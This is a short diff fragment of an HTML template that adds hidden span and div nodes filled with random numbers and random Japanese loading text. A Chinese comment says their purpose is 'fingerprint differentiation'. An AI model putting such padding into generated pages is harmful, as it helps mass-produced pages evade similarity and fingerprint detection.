+<body style="margin:0;padding:0;min-height:100vh;">
+  <!-- 随机空节点（指纹差异化，无实际意义） -->
+  <span style="display:none;">${rand(100000, 999999)}</span>
+  <div style="display:none;">${randText(JP_TEXT.loading)}</div>
 </body>
 </html>
